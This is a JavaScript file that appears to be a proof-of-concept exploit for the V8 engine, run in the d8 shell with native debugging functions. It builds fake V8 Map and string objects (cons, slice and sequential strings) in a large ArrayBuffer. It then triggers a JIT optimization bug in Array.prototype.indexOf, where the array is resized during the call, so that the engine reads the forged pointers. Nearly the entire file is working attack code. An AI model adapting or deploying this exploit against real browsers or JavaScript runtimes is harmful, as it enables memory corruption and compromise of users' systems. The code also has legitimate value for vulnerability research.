var conv_ab = new ArrayBuffer(8);
var conv_f64 = new Float64Array(conv_ab);
var conv_u64 = new BigUint64Array(conv_ab);
BigInt.prototype.to_float = function() {
  conv_u64[0] = this;
  return conv_f64[0];
};
BigInt.prototype.hex = function() {
  return '0x'+this.toString(16);
};

let b = false;
let array = [Array, 1.2];
let ab = new ArrayBuffer(1<<30);
let u64 = new BigUint64Array(ab);

function write_map(offset, type) {
  u64[offset/8n + 0x0n] = 0x12345n;
  u64[offset/8n + 0x1n] = 0x190000002900a804n | (type << 32n);
  u64[offset/8n + 0x2n] = 0x92003ffn;  // bitfield 3
  u64[offset/8n + 0x3n] = 0x41414141n; // prototype
  u64[offset/8n + 0x4n] = 0x41414141n; // constructor or back ptr
  u64[offset/8n + 0x5n] = 0n;          // transistions or proto info
  u64[offset/8n + 0x6n] = 0x41414141n; // instance descriptors
  u64[offset/8n + 0x7n] = 0n;          // layout descriptor
  u64[offset/8n + 0x8n] = 0x41414141n; // dependent code
  u64[offset/8n + 0x9n] = 0n;          // prototype validity cell
}

let ab_addr = %AddrOf(ab)-1n;
ab_addr = %PtrAt(ab_addr+0x20n);
print(`Buf at ${ab_addr.hex()}`);

let space_start_addr = (ab_addr & 0xfffffffffffc0000n) + 0x40000n;
let space_start_off = space_start_addr - ab_addr;

let free_mem = space_start_addr + 4096n;

function page_round(addr) {
  if ((addr & 0xfffn) == 0n) {
    return addr;
  }
  return (addr + 0x1000n) & 0xfffffffffffff000n;
}

function u64_offset(addr) {
  return (addr - ab_addr) / 8n;
}

class V8String {
  constructor(type, data) {
    let size = BigInt(data.length)*8n;
    this.addr = free_mem;
    free_mem += page_round(size);
    this.map = free_mem;
    free_mem += page_round(0x9n*8n);
    let this_off = u64_offset(this.addr);
    u64[this_off] = this.map|1n;
    for (let i = 0n; i < data.length; i++) {
      u64[this_off + 1n + i] = data[i];
    }
    let map_off = u64_offset(this.map);
    u64[map_off + 0x0n] = 0x12345n;
    u64[map_off + 0x1n] = 0x190000002900a804n | (type << 32n);
    u64[map_off + 0x2n] = 0x92003ffn;  // bitfield 3
    u64[map_off + 0x3n] = 0x41414141n; // prototype
    u64[map_off + 0x4n] = 0x41414141n; // constructor or back ptr
    u64[map_off + 0x5n] = 0n;          // transistions or proto info
    u64[map_off + 0x6n] = 0x41414141n; // instance descriptors
    u64[map_off + 0x7n] = 0n;          // layout descriptor
    u64[map_off + 0x8n] = 0x41414141n; // dependent code
    u64[map_off + 0x9n] = 0n;          // prototype validity cell
  }
}

class ConsString extends V8String {
  constructor(size, left, right) {
    super(0x29n, [(size<<32n) | 0x00000003n, left|1n, right|1n]);
  }
}

class SliceString extends V8String {
  constructor(parent_string, offset, len=0x100n) {
    super(0x2bn, [(len<<32n) | 0x00000003n, parent_string|1n, offset<<32n]);
  }
}

class SeqString extends V8String {
  constructor(data) {
    super(0x08n, [(BigInt(data.length*8) << 32n | 0xdf61f02en)].concat(data));
  }
}

let x30000As = new Array(0x30000/8);
x30000As.fill(0x4141414141414141n);
x30000As = new SeqString(x30000As);

let cons2 = new ConsString(0n, x30000As.addr, x30000As.addr);
let slice2 = new SliceString(cons2.addr, 0x80000000n, 0x00000000n);
let cons1 = new ConsString(0n, slice2.addr, 0x41414141n);
let slice1 = new SliceString(cons1.addr, 0x80000000n, 0x1n);
let prefix = new SeqString([0x4141414141414141n]);
let root_string = new ConsString(0x1000n, prefix.addr, slice1.addr);

let x100As = new Array(0x100/8);
x100As.fill(0x4141414141414141n);
let boundary = new SeqString(x100As);

function f(to_search) {
  if (b) {
    array[100000] = 1.1;
    let a = [
        (root_string.addr|1n).to_float(),
        (boundary.addr|1n).to_float()
    ];
  };
  return to_search;
};

%NeverOptimizeFunction(f);
function foo(to_search) {
  return array.indexOf(f(to_search), 20);
}

foo('');
foo('');
%OptimizeFunctionOnNextCall(foo);
foo('');
b = true;
foo('A'.repeat(0x1000));
